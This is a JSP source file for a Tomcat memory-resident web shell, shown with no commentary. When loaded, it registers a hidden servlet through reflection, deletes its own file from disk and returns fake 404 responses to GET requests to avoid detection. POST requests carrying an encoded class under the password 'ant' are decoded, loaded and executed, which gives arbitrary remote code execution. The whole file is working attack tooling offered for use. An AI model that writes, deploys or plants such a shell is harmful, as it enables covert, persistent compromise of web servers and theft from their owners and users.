<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@page import="java.io.*,java.util.zip.*"%>

<%!
    // CHANGE THIS!!
    String path = "/change/this/path/*";
    String pwd = "ant";

    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    class ProcServlet extends HttpServlet {
        @Override
        public void doGet(HttpServletRequest req, HttpServletResponse res) {
            try {
            res.sendError(404); // hide
            } catch (Exception e) {}
        }

        @Override
        public void doPost(HttpServletRequest request, HttpServletResponse response) {
            try {
                String cls = request.getParameter(pwd);
                if (cls != null) {
                    new U(this.getClass().getClassLoader()).g(decompress(base64Decode(cls))).newInstance().equals(new Object[]{request,response});
                } else {
                    response.sendError(404); // hide
                }
            } catch (Exception e) {}
        }
    }
    
    public byte[] base64Decode(String str) {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception e) {
            try {
                base64=Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
            } catch (Exception ee) {}
        }
        return value;
    }

    public byte[] decompress(byte[] data) {
        byte[] output = new byte[0];
        Inflater dc = new Inflater();
        dc.reset();
        dc.setInput(data);
        ByteArrayOutputStream o = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!dc.finished()) {
                int i = dc.inflate(buf);
                o.write(buf, 0, i);
            }
            output = o.toByteArray();
        } catch (Exception e) {
            output = data;
        } finally {
            try {
                o.close();
            } catch (IOException e) {}
        }
        dc.end();
        return output;
    }

    public StandardContext getStdCtx(HttpServletRequest request) {
        try {
            ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) request.getServletContext();
            Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");
            appCtxFacadeField.setAccessible(true);
            ApplicationContext appCtx = (ApplicationContext) appCtxFacadeField.get(appCtxFacade);
            Field appCtxField = ApplicationContext.class.getDeclaredField("context");
            appCtxField.setAccessible(true);
            return (StandardContext) appCtxField.get(appCtx);
        } catch (Exception e) {}
        return null;
    }
%>

<%
    if (request.getParameter("load") != null) {
        ProcServlet ProcServlet = new ProcServlet();
        StandardWrapper stdWrapper = new StandardWrapper();
        StandardContext stdCtx = getStdCtx(request);
        stdWrapper.setServletName("ProcServlet");
        stdWrapper.setServlet(ProcServlet);
        stdWrapper.setServletClass(ProcServlet.getClass().getName());
        stdCtx.addChild(stdWrapper);
        stdCtx.addServletMapping(path, "ProcServlet");

        new File(request.getRealPath(request.getServletPath())).delete();
        response.getWriter().println("Loaded into memory. This jsp file has been automatically deleted!!");
    }
%>